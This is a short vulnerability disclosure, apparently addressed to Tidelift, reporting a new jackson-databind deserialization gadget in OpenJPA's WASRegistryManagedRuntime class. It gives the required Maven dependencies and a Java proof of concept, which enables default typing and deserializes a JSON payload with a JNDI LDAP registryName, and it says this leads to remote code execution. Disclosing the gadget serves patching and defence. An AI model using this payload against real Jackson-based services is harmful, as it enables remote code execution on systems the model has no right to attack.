(from XuYuanzhen)

Hey Tidelift, 
I find a new gadget of jackson-databind which will lead to a RCE vulnerability.

The gadget class is org.apache.openjpa.ee.WASRegistryManagedRuntime which belonging to openjpa.jar 

The dependencies in pom.xml as follow
<dependency>
    <groupId>org.apache.openjpa</groupId>
    <artifactId>openjpa</artifactId>
    <version>2.4.0</version>
</dependency>
<dependency>
    <groupId>com.ibm.websphere</groupId>
    <artifactId>uow</artifactId>
    <version>6.0.2.17</version>
</dependency>
The PoC as follow
        String jsonTest = "[\"org.apache.openjpa.ee.WASRegistryManagedRuntime\",
        {\"registryName\":\"ldap://127.0.0.1:1389/d5kfet\",\"rollbackOnly\":null}]";
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;


public class JacksonTest2 {

    public static void main(String[] args) throws Exception {
        String jsonTest = "[\"org.apache.openjpa.ee.WASRegistryManagedRuntime\",
{\"registryName\":\"ldap://127.0.0.1/d5kfet\",\"rollbackOnly\":null}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
        System.out.println("Serializing");
        Object obj = mapper.readValue(jsonTest, Object.class);
        System.out.println("objectified");
        mapper.writeValueAsString(obj);
    }
}
Execute the PoC and then Pop up the Calculator
